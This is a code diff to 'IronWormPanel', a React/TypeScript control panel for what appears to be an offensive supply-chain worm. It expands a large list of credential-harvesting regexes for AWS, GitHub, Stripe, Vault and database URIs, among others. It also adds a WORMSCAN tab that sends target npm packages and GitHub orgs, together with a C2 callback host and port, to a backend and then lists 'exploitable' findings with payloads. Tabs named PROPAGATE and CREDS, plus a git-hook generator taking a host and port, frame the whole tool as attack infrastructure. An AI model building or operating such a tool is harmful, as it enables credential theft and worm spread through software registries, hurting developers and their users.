@@ -90,29 +90,48 @@ function makeGitHook(host: string, port: string, t: string) {
 // ─── CREDENTIAL PATTERNS ─────────────────────────────────────────────────────
 interface CredMatch { kind: string; pattern: string; value: string; redacted: string; severity: "critical"|"high"|"medium"; line: number; }
 const CRED_PATTERNS: { kind: string; re: RegExp; severity: "critical"|"high"|"medium" }[] = [
-  { kind:"AWS Access Key",       re:/AKIA[A-Z0-9]{16}/g,                                              severity:"critical" },
-  { kind:"AWS Secret Key",       re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,     severity:"critical" },
-  { kind:"GitHub PAT (ghp)",     re:/ghp_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
-  { kind:"GitHub PAT (gho/ghu)", re:/gh[ours]_[A-Za-z0-9]{36}/g,                                     severity:"critical" },
-  { kind:"GitHub Fine-grained",  re:/github_pat_[A-Za-z0-9_]{82}/g,                                   severity:"critical" },
-  { kind:"npm Token",            re:/npm_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
-  { kind:"PyPI Token",           re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                      severity:"critical" },
-  { kind:"Google API Key",       re:/AIza[0-9A-Za-z\-_]{35}/g,                                        severity:"critical" },
-  { kind:"Stripe Live Key",      re:/sk_live_[A-Za-z0-9]{24,}/g,                                      severity:"critical" },
-  { kind:"Stripe Test Key",      re:/sk_test_[A-Za-z0-9]{24,}/g,                                      severity:"high"     },
-  { kind:"Docker Hub PAT",       re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                  severity:"critical" },
-  { kind:"Slack Token",          re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                 severity:"critical" },
-  { kind:"Slack Webhook",        re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g, severity:"high" },
-  { kind:"Discord Token",        re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,  severity:"critical" },
-  { kind:"JWT",                  re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,     severity:"high"     },
-  { kind:"SSH Private Key",      re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,   severity:"critical" },
-  { kind:"MongoDB URI",          re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                    severity:"critical" },
-  { kind:"PostgreSQL URI",       re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                      severity:"critical" },
-  { kind:"Heroku API Key",       re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, severity:"critical" },
-  { kind:"Azure Storage Key",    re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g, severity:"critical" },
-  { kind:"Kubernetes SA Token",  re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,  severity:"high"     },
-  { kind:"Generic Secret",       re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi, severity:"medium" },
-  { kind:"Generic Password",     re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,    severity:"medium"   },
+  { kind:"AWS Access Key",           re:/AKIA[A-Z0-9]{16}/g,                                                                                           severity:"critical" },
+  { kind:"AWS Secret Key",           re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,                                                   severity:"critical" },
+  { kind:"AWS Session Token",        re:/FwoGZXIvYXdzE[A-Za-z0-9/+]{100,}/g,                                                                           severity:"critical" },
+  { kind:"GitHub PAT (ghp)",         re:/ghp_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
+  { kind:"GitHub PAT (gho/ghs)",     re:/gh[osurp]_[A-Za-z0-9]{36}/g,                                                                                 severity:"critical" },
+  { kind:"GitHub Fine-grained",      re:/github_pat_[A-Za-z0-9_]{82}/g,                                                                                severity:"critical" },
+  { kind:"GitHub App Key",           re:/-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----/g,                                        severity:"critical" },
+  { kind:"npm Token",                re:/npm_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
+  { kind:"PyPI Token",               re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                                                                   severity:"critical" },
+  { kind:"Google API Key",           re:/AIza[0-9A-Za-z\-_]{35}/g,                                                                                     severity:"critical" },
+  { kind:"Google OAuth Client",      re:/[0-9]+-[A-Za-z0-9_]+\.apps\.googleusercontent\.com/g,                                                         severity:"high"     },
+  { kind:"GCP Service Account Key",  re:/"private_key":\s*"-----BEGIN RSA PRIVATE KEY/g,                                                                severity:"critical" },
+  { kind:"Stripe Live Key",          re:/sk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
+  { kind:"Stripe Restricted Key",    re:/rk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
+  { kind:"Stripe Test Key",          re:/sk_test_[A-Za-z0-9]{24,}/g,                                                                                   severity:"high"     },
+  { kind:"Stripe Webhook Secret",    re:/whsec_[A-Za-z0-9]{32,}/g,                                                                                     severity:"high"     },
+  { kind:"Docker Hub PAT",           re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                                                               severity:"critical" },
+  { kind:"Slack Token",              re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                                                              severity:"critical" },
+  { kind:"Slack Webhook",            re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g,                                severity:"high"     },
+  { kind:"Discord Token",            re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,                                               severity:"critical" },
+  { kind:"Discord Webhook",          re:/https:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_\-]+/g,                                     severity:"high"     },
+  { kind:"Twilio Account SID",       re:/AC[0-9a-f]{32}/g,                                                                                             severity:"critical" },
+  { kind:"Twilio Auth Token",        re:/SK[0-9a-f]{32}/g,                                                                                             severity:"critical" },
+  { kind:"SendGrid API Key",         re:/SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/g,                                                                severity:"critical" },
+  { kind:"Mailgun API Key",          re:/key-[0-9a-z]{32}/g,                                                                                           severity:"critical" },
+  { kind:"JWT",                      re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                  severity:"high"     },
+  { kind:"SSH Private Key",          re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,                                                severity:"critical" },
+  { kind:"PGP Private Key",          re:/-----BEGIN PGP PRIVATE KEY BLOCK-----/g,                                                                       severity:"critical" },
+  { kind:"MongoDB URI",              re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                               severity:"critical" },
+  { kind:"PostgreSQL URI",           re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                 severity:"critical" },
+  { kind:"MySQL URI",                re:/mysql(?:2)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                     severity:"critical" },
+  { kind:"Redis URI",                re:/redis:\/\/:[^@]+@[^\s"'<>]+/g,                                                                                severity:"critical" },
+  { kind:"Heroku API Key",           re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,      severity:"critical" },
+  { kind:"Azure Storage Key",        re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g,                             severity:"critical" },
+  { kind:"Azure SAS Token",          re:/sig=[A-Za-z0-9%+/=]{30,}/g,                                                                                   severity:"high"     },
+  { kind:"Kubernetes SA Token",      re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                severity:"high"     },
+  { kind:"Kubernetes kubeconfig",    re:/apiVersion:\s*v1[\s\S]{0,100}current-context:/g,                                                               severity:"high"     },
+  { kind:"HashiCorp Vault Token",    re:/s\.[A-Za-z0-9]{24}/g,                                                                                         severity:"critical" },
+  { kind:"Terraform Cloud Token",    re:/(?:TF_TOKEN|token)\s*=\s*"([A-Za-z0-9.]{40,})"/g,                                                             severity:"critical" },
+  { kind:"Datadog API Key",          re:/(?:dd_api_key|DD_API_KEY)[^A-Za-z0-9][0-9a-f]{32}/gi,                                                         severity:"high"     },
+  { kind:"Generic Secret",           re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi,                 severity:"medium"   },
+  { kind:"Generic Password",         re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,                                                  severity:"medium"   },
 ];
 
 function scanCreds(text: string): CredMatch[] {
@@ -833,7 +852,7 @@ function Artifact({ label, content }: { label: string; content: string }) {
 }
 
 // ─── MAIN COMPONENT ──────────────────────────────────────────────────────────
-type IWTab = "scan"|"creds"|"propagate"|"rustgen";
+type IWTab = "scan"|"creds"|"propagate"|"rustgen"|"wormscan";
 
 export default function IronWormPanel() {
   const [tab, setTab] = useState<IWTab>("scan");
@@ -1066,11 +1085,74 @@ export default function IronWormPanel() {
     const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "ironworm-src.tar.txt"; a.click(); URL.revokeObjectURL(a.href);
   }, [rustFiles]);
 
+  // ── WORMSCAN state ───────────────────────────────────────
+  interface WormScanResult { name:string; category:string; detail:string; severity:"critical"|"high"|"medium"|"low"; status:"success"|"failed"|"skipped"; payload?:string; }
+  interface WormScanLog    { level:"info"|"warn"|"error"|"success"; msg:string; ts:string; }
+  const [wormPkg,      setWormPkg]      = useState("");
+  const [wormOrg,      setWormOrg]      = useState("");
+  const [wormRepo,     setWormRepo]     = useState("");
+  const [wormLogs,     setWormLogs]     = useState<WormScanLog[]>([]);
+  const [wormResults,  setWormResults]  = useState<WormScanResult[]>([]);
+  const [wormRunning,  setWormRunning]  = useState(false);
+  const [wormProgress, setWormProgress] = useState<{done:number;total:number;pct:number;label:string}|null>(null);
+  const wormWsRef  = useRef<WebSocket|null>(null);
+  const wormLogRef = useRef<HTMLDivElement>(null);
+  useEffect(() => { if (wormLogRef.current) wormLogRef.current.scrollTop = wormLogRef.current.scrollHeight; }, [wormLogs]);
+  const addWormLog = useCallback((log: WormScanLog) => setWormLogs(p => [...p.slice(-500), log]), []);
+
+  const wormWsBase = useCallback((): string => {
+    const apiUrl = (import.meta.env as Record<string,string>)["VITE_API_URL"] ?? "";
+    if (apiUrl) {
+      const u = new URL(apiUrl);
+      return `${u.protocol === "https:" ? "wss:" : "ws:"}//${u.host}/api/ws`;
+    }
+    return `${window.location.protocol === "https:" ? "wss:" : "ws:"}//${window.location.host}/api/ws`;
+  }, []);
+
+  const startWormScan = useCallback(() => {
+    if (wormRunning || (!wormPkg.trim() && !wormOrg.trim())) return;
+    wormWsRef.current?.close(1000, "new scan");
+    setWormLogs([]); setWormResults([]); setWormProgress(null); setWormRunning(true);
+    const ws = new WebSocket(`${wormWsBase()}/ironworm`);
+    wormWsRef.current = ws;
+    ws.onopen = () => ws.send(JSON.stringify({
+      packageName:    wormPkg.trim()  || undefined,
+      githubOrg:      wormOrg.trim()  || undefined,
+      githubRepo:     wormRepo.trim() || undefined,
+      cbHost:         cbHost || "LHOST",
+      cbPort:         cbPort || "9999",
+      propagate:      false,
+    }));
+    ws.onmessage = (ev) => {
+      try {
+        const msg = JSON.parse(ev.data as string) as Record<string,unknown>;
+        if (msg["type"] === "log") {
+          addWormLog({ level: msg["level"] as "info", msg: String(msg["msg"]), ts: String(msg["ts"]) });
+        } else if (msg["type"] === "result") {
+          setWormResults(p => [...p, msg["result"] as WormScanResult]);
+        } else if (msg["type"] === "progress") {
+          setWormProgress({ done: Number(msg["done"]), total: Number(msg["total"]), pct: Number(msg["pct"]), label: String(msg["label"]) });
+        }
+      } catch { }
+    };
+    ws.onclose  = () => { setWormRunning(false); wormWsRef.current = null; };
+    ws.onerror  = () => { addWormLog({ level:"error", msg:"WebSocket connection error", ts: new Date().toISOString() }); setWormRunning(false); };
+  }, [wormRunning, wormPkg, wormOrg, wormRepo, cbHost, cbPort, wormWsBase, addWormLog]);
+
+  const stopWormScan = useCallback(() => {
+    wormWsRef.current?.close(1000, "user abort");
+    wormWsRef.current = null;
+    setWormRunning(false);
+  }, []);
+
+  useEffect(() => () => { wormWsRef.current?.close(1000, "unmount"); }, []);
+
   const TABS_CONFIG: { id: IWTab; label: string; badge?: string }[] = [
-    { id:"scan",       label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
-    { id:"creds",      label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
-    { id:"propagate",  label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
-    { id:"rustgen",    label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
+    { id:"scan",      label:"SCAN",      badge: scanResults.length > 0 ? String(scanResults.length) : undefined },
+    { id:"creds",     label:"CREDS",     badge: credMatches.length > 0 ? String(credMatches.length) : undefined },
+    { id:"propagate", label:"PROPAGATE", badge: propResults.filter(r=>r.ok).length > 0 ? `${propResults.filter(r=>r.ok).length}✓` : undefined },
+    { id:"rustgen",   label:"RUSTGEN",   badge: genDone ? String(rustFiles.length)+"f" : undefined },
+    { id:"wormscan",  label:"WORMSCAN",  badge: wormResults.length > 0 ? String(wormResults.length) : undefined },
   ];
 
   return (
@@ -1346,6 +1428,88 @@ export default function IronWormPanel() {
                 </div>
                 <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Generated Files</div>
                 {rustFiles.map((f,i) => <Artifact key={i} label={f.name} content={f.content} />)}
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* ── WORMSCAN TAB ──────────────────────────────────────── */}
+      {tab === "wormscan" && (
+        <div className="flex flex-1 min-h-0 overflow-hidden">
+          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Target Package</label>
+            <input value={wormPkg} onChange={e=>setWormPkg(e.target.value)} placeholder="e.g. lodash" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Org</label>
+            <input value={wormOrg} onChange={e=>setWormOrg(e.target.value)} placeholder="e.g. acmecorp" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Repo (opt)</label>
+            <input value={wormRepo} onChange={e=>setWormRepo(e.target.value)} placeholder="e.g. api-gateway" disabled={wormRunning}
+              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
+            <div className="text-[9px] text-zinc-700 border-t border-white/[.04] pt-3">
+              <p>C2: {cbHost||"LHOST"}:{cbPort||"9999"}</p>
+              <p className="text-[8px] text-zinc-800 mt-1">Configured in header ↑</p>
+            </div>
+            <div className="flex gap-2 pt-1">
+              <button onClick={startWormScan} disabled={wormRunning || (!wormPkg.trim() && !wormOrg.trim())}
+                className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40"
+                style={{background:wormRunning?"transparent":"rgba(220,38,38,.15)",borderColor:wormRunning?"rgba(255,255,255,.07)":"rgba(220,38,38,.5)",color:wormRunning?"#52525b":"#f87171"}}>
+                {wormRunning
+                  ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Scanning…</span>
+                  : "► WORMSCAN"}
+              </button>
+              {wormRunning && <button onClick={stopWormScan} className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>}
+            </div>
+          </div>
+
+          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
+            {wormProgress && (
+              <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0 bg-black/30">
+                <div className="flex-1 bg-zinc-900 h-1.5 rounded-full overflow-hidden">
+                  <div className="h-full bg-red-700 transition-all duration-300" style={{width:`${wormProgress.pct}%`}} />
+                </div>
+                <span className="text-[9px] text-zinc-500 w-8 text-right">{wormProgress.pct}%</span>
+                <span className="text-[9px] text-zinc-600 truncate max-w-[200px]">{wormProgress.label}</span>
+              </div>
+            )}
+
+            <div ref={wormLogRef} className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto"
+              style={{height: wormResults.length === 0 ? "100%" : "9rem"}}>
+              {wormLogs.length === 0 && !wormRunning && (
+                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2">
+                  <span className="text-4xl opacity-20">⛓</span>
+                  <p className="text-[10px] uppercase tracking-widest">Configure targets and launch WORMSCAN</p>
+                  <p className="text-[9px] text-zinc-800">Streams live results from the supply-chain scanner</p>
+                </div>
+              )}
+              {wormLogs.map((l,i) => (
+                <div key={i} className={`text-[9px] font-mono leading-[1.5] ${l.level==="error"?"text-red-400":l.level==="warn"?"text-orange-300":l.level==="success"?"text-green-400":"text-zinc-500"}`}>
+                  <span className="text-zinc-700 mr-2">{new Date(l.ts).toLocaleTimeString()}</span>{l.msg}
+                </div>
+              ))}
+              {wormRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
+            </div>
+
+            {wormResults.length > 0 && (
+              <div className="flex-1 overflow-y-auto p-3 space-y-2 min-h-0">
+                <div className="flex items-center gap-4 mb-2 text-[9px]">
+                  <span className="text-zinc-600 uppercase tracking-widest">{wormResults.length} findings</span>
+                  <span className="text-red-400">{wormResults.filter(r=>r.severity==="critical").length} critical</span>
+                  <span className="text-orange-400">{wormResults.filter(r=>r.severity==="high").length} high</span>
+                  <span className="text-green-400 ml-auto">{wormResults.filter(r=>r.status==="success").length} exploitable</span>
+                </div>
+                {wormResults.map((r,i) => (
+                  <div key={i} className={`border p-3 text-[10px] transition-all ${r.severity==="critical"?"border-red-900/50 bg-red-950/10":r.severity==="high"?"border-orange-900/40 bg-orange-950/10":"border-zinc-800"}`}>
+                    <div className="flex items-center gap-2 mb-1">
+                      <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[r.severity]??SEV["medium"]}`}>{r.severity}</span>
+                      <span className="text-white font-bold truncate">{r.name}</span>
+                      <span className={`text-[8px] px-1.5 border ml-auto flex-shrink-0 ${r.status==="success"?"text-green-400 border-green-900":"text-zinc-500 border-zinc-700"}`}>{r.status.toUpperCase()}</span>
+                    </div>
+                    <div className="text-zinc-500 mt-0.5">[{r.category}] {r.detail}</div>
+                    {r.payload && <div className="mt-1.5 text-[9px] text-cyan-500 font-mono truncate border border-cyan-900/30 bg-cyan-950/10 px-2 py-1">{r.payload.slice(0,150)}</div>}
+                  </div>
+                ))}
               </div>
             )}
           </div>
